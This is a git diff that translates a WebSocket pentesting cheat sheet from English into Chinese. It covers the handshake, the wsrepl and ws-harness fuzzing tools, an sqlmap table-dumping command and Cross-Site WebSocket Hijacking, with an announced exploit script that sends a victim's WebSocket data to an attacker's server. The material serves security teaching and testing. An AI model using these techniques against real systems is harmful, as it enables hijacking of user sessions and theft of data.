@@ -1,33 +1,35 @@
+[原文文档](README.en.md)
+
 # Web Sockets
 
-> WebSocket is a communication protocol that provides full-duplex communication channels over a single, long-lived connection. This enables real-time, bi-directional communication between clients (typically web browsers) and servers through a persistent connection. WebSockets are commonly used for web applications that require frequent, low-latency updates, such as live chat applications, online gaming, real-time notifications, and financial trading platforms.
+> WebSocket是一种通信协议，通过单个持久连接提供全双工通信通道。这使得客户端（通常是Web浏览器）和服务器之间能够通过持久连接进行实时的双向通信。WebSocket通常用于需要频繁、低延迟更新的Web应用程序，例如实时聊天应用程序、在线游戏、实时通知和金融交易平台。
 
-## Summary
+## 摘要
 
-* [Tools](#tools)
-* [Methodology](#methodology)
-    * [Web Socket Protocol](#web-socket-protocol)
+* [工具](#工具)
+* [方法论](#方法论)
+    * [Web Socket协议](#web-socket协议)
     * [SocketIO](#socketio)
-    * [Using wsrepl](#using-wsrepl)
-    * [Using ws-harness.py](#using-ws-harnesspy)
-* [Cross-Site WebSocket Hijacking (CSWSH)](#cross-site-websocket-hijacking-cswsh)
-* [Labs](#labs)
-* [References](#references)
+    * [使用wsrepl](#使用wsrepl)
+    * [使用ws-harness.py](#使用ws-harnesspy)
+* [跨站WebSocket劫持(CSWSH)](#跨站websocket劫持cswsh)
+* [实验室](#实验室)
+* [参考资料](#参考资料)
 
-## Tools
+## 工具
 
-* [doyensec/wsrepl](https://github.com/doyensec/wsrepl) - WebSocket REPL for pentesters
+* [doyensec/wsrepl](https://github.com/doyensec/wsrepl) - 渗透测试人员的WebSocket REPL
 * [mfowl/ws-harness.py](https://gist.githubusercontent.com/mfowl/ae5bc17f986d4fcc2023738127b06138/raw/e8e82467ade45998d46cef355fd9b57182c3e269/ws.harness.py)
-* [PortSwigger/websocket-turbo-intruder](https://github.com/PortSwigger/websocket-turbo-intruder) - Fuzz WebSockets with custom Python code
-* [snyk/socketsleuth](https://github.com/snyk/socketsleuth) - Burp Extension to add additional functionality for pentesting websocket based applications
+* [PortSwigger/websocket-turbo-intruder](https://github.com/PortSwigger/websocket-turbo-intruder) - 使用自定义Python代码对WebSocket进行模糊测试
+* [snyk/socketsleuth](https://github.com/snyk/socketsleuth) - Burp扩展，为基于WebSocket的应用程序渗透测试添加额外功能
 
-## Methodology
+## 方法论
 
-### Web Socket Protocol
+### Web Socket协议
 
-WebSockets start as a normal `HTTP/1.1` request and then upgrade the connection to use the WebSocket protocol.
+WebSocket从普通的`HTTP/1.1`请求开始，然后将连接升级为使用WebSocket协议。
 
-The client sends a specially crafted HTTP request with headers indicating it wants to switch to the WebSocket protocol:
+客户端发送一个特殊构造的HTTP请求，其头部表示它想要切换到WebSocket协议：
 
 ```http
 GET /chat HTTP/1.1
@@ -38,7 +40,7 @@ Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
 Sec-WebSocket-Version: 13
 ```
 
-Server responds with an `HTTP 101 Switching Protocols` response. If the server accepts the request, it replies like this.
+服务器响应`HTTP 101 Switching Protocols`。如果服务器接受请求，它会这样回复：
 
 ```http
 HTTP/1.1 101 Switching Protocols
@@ -49,20 +51,20 @@ Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
 
 ### SocketIO
 
-Socket.IO is a JavaScript library (for both client and server) that provides a higher-level abstraction over WebSockets, designed to make real-time communication easier and more reliable across browsers and environments.
+Socket.IO是一个JavaScript库（适用于客户端和服务器），它提供了WebSocket的更高级抽象，旨在使跨浏览器和环境的实时通信更容易和更可靠。
 
-### Using wsrepl
+### 使用wsrepl
 
-`wsrepl`, a tool developed by Doyensec, aims to simplify the auditing of websocket-based apps. It offers an interactive REPL interface that is user-friendly and easy to automate. The tool was developed during an engagement with a client whose web application heavily relied on WebSockets for soft real-time communication.
+`wsrepl`是由Doyensec开发的工具，旨在简化基于WebSocket的应用程序的审计。它提供了一个交互式REPL界面，用户友好且易于自动化。该工具是在与一个客户的合作期间开发的，该客户的Web应用程序严重依赖WebSocket进行软实时通信。
 
-wsrepl is designed to provide a balance between an interactive REPL experience and automation. It is built with Python’s TUI framework Textual, and it interoperates with curl’s arguments, making it easy to transition from the Upgrade request in Burp to wsrepl. It also provides full transparency of WebSocket opcodes as per RFC 6455 and has an automatic reconnection feature in case of disconnects.
+wsrepl旨在在交互式REPL体验和自动化之间提供平衡。它基于Python的TUI框架Textual构建，并与curl的参数互操作，使得从Burp中的升级请求轻松过渡到wsrepl。它还根据RFC 6455提供WebSocket操作码的完全透明性，并在断连时具有自动重连功能。
 
 ```ps1
 pip install wsrepl
 wsrepl -u URL -P auth_plugin.py
 ```
 
-Moreover, wsrepl simplifies the process of transitioning into WebSocket automation. Users just need to write a Python plugin. The plugin system is designed to be flexible, allowing users to define hooks that are executed at various stages of the WebSocket lifecycle (init, on_message_sent, on_message_received, ...).
+此外，wsrepl简化了过渡到WebSocket自动化的过程。用户只需编写一个Python插件。插件系统设计为灵活，允许用户定义在WebSocket生命周期的各个阶段执行的钩子（init、on_message_sent、on_message_received等）。
 
 ```py
 from wsrepl import Plugin
@@ -102,15 +104,15 @@ class Demo(Plugin):
         message.long = original
 ```
 
-### Using ws-harness.py
+### 使用ws-harness.py
 
-Start `ws-harness` to listen on a web-socket, and specify a message template to send to the endpoint.
+启动`ws-harness`来监听web-socket，并指定要发送到端点的消息模板。
 
 ```powershell
 python ws-harness.py -u "ws://dvws.local:8080/authenticate-user" -m ./message.txt
 ```
 
-The content of the message should contains the **[FUZZ]** keyword.
+消息内容应包含**[FUZZ]**关键字。
 
 ```json
 {
@@ -119,21 +121,17 @@ The content of the message should contains the **[FUZZ]** keyword.
 }
 ```
 
-Then you can use any tools against the newly created web service, working as a proxy and tampering on the fly the content of message sent thru the websocket.
+然后您可以对新创建的web服务使用任何工具，充当代理并动态篡改通过websocket发送的消息内容。
 
 ```python
 sqlmap -u http://127.0.0.1:8000/?fuzz=test --tables --tamper=base64encode --dump
 ```
 
-## Cross-Site WebSocket Hijacking (CSWSH)
+## 跨站WebSocket劫持(CSWSH)
 
-If the WebSocket handshake is not correctly protected using a CSRF token or a
-nonce, it's possible to use the authenticated WebSocket of a user on an
-attacker's controlled site because the cookies are automatically sent by the
-browser. This attack is called Cross-Site WebSocket Hijacking (CSWSH).
+如果WebSocket握手没有使用CSRF令牌或nonce正确保护，则可以在攻击者控制的网站上使用用户的经过身份验证的WebSocket，因为Cookie由浏览器自动发送。这种攻击称为跨站WebSocket劫持(CSWSH)。
 
-Example exploit, hosted on an attacker's server, that exfiltrates the received
-data from the WebSocket to the attacker:
+托管在攻击者服务器上的示例漏洞利用，它将WebSocket接收到的数据泄露给攻击者：
 
 ```html
 <script>
@@ -148,24 +146,21 @@ data from the WebSocket to the attacker:
 </script>
 ```
 
-You have to adjust the code to your exact situation. E.g. if your web
-application uses a `Sec-WebSocket-Protocol` header in the handshake request,
-you have to add this value as a 2nd parameter to the `WebSocket` function call
-in order to add this header.
+您必须根据您的确切情况调整代码。例如，如果您的web应用程序在握手请求中使用`Sec-WebSocket-Protocol`头部，则您必须将此值作为`WebSocket`函数调用的第二个参数添加，以添加此头部。
 
-## Labs
+## 实验室
 
-* [PortSwigger - Manipulating WebSocket messages to exploit vulnerabilities](https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities)
-* [PortSwigger - Cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)
-* [PortSwigger - Manipulating the WebSocket handshake to exploit vulnerabilities](https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities)
+* [PortSwigger - 操作WebSocket消息以利用漏洞](https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities)
+* [PortSwigger - 跨站WebSocket劫持](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)
+* [PortSwigger - 操作WebSocket握手以利用漏洞](https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities)
 * [Root Me - Web Socket - 0 protection](https://www.root-me.org/en/Challenges/Web-Client/Web-Socket-0-protection)
 
-## References
+## 参考资料
 
-* [Cross Site WebSocket Hijacking with socketio - Jimmy Li - August 17, 2020](https://blog.jimmyli.us/articles/2020-08/Cross-Site-WebSocket-Hijacking-With-SocketIO)
-* [Hacking Web Sockets: All Web Pentest Tools Welcomed - Michael Fowl - March 5, 2019](https://web.archive.org/web/20190306170840/https://www.vdalabs.com/2019/03/05/hacking-web-sockets-all-web-pentest-tools-welcomed/)
-* [Hacking with WebSockets - Mike Shema, Sergey Shekyan, Vaagn Toukharian - September 20, 2012](https://media.blackhat.com/bh-us-12/Briefings/Shekyan/BH_US_12_Shekyan_Toukharian_Hacking_Websocket_Slides.pdf)
-* [Mini WebSocket CTF - Snowscan - January 27, 2020](https://snowscan.io/bbsctf-evilconneck/#)
-* [Streamlining Websocket Pentesting with wsrepl - Andrez Konstantinov - July 18, 2023](https://blog.doyensec.com/2023/07/18/streamlining-websocket-pentesting-with-wsrepl.html)
-* [Testing for WebSockets security vulnerabilities - PortSwigger - September 28, 2019](https://portswigger.net/web-security/websockets)
-* [WebSocket Attacks - HackTricks - July 19, 2024](https://book.hacktricks.xyz/pentesting-web/websocket-attacks)
+* [使用socketio进行跨站WebSocket劫持 - Jimmy Li - 2020年8月17日](https://blog.jimmyli.us/articles/2020-08/Cross-Site-WebSocket-Hijacking-With-SocketIO)
+* [黑客Web Sockets：欢迎所有Web渗透测试工具 - Michael Fowl - 2019年3月5日](https://web.archive.org/web/20190306170840/https://www.vdalabs.com/2019/03/05/hacking-web-sockets-all-web-pentest-tools-welcomed/)
+* [使用WebSockets进行黑客攻击 - Mike Shema, Sergey Shekyan, Vaagn Toukharian - 2012年9月20日](https://media.blackhat.com/bh-us-12/Briefings/Shekyan/BH_US_12_Shekyan_Toukharian_Hacking_Websocket_Slides.pdf)
+* [小型WebSocket CTF - Snowscan - 2020年1月27日](https://snowscan.io/bbsctf-evilconneck/#)
+* [使用wsrepl简化WebSocket渗透测试 - Andrez Konstantinov - 2023年7月18日](https://blog.doyensec.com/2023/07/18/streamlining-websocket-pentesting-with-wsrepl.html)
+* [测试WebSockets安全漏洞 - PortSwigger - 2019年9月28日](https://portswigger.net/web-security/websockets)
+* [WebSocket攻击 - HackTricks - 2024年7月19日](https://book.hacktricks.xyz/pentesting-web/websocket-attacks)
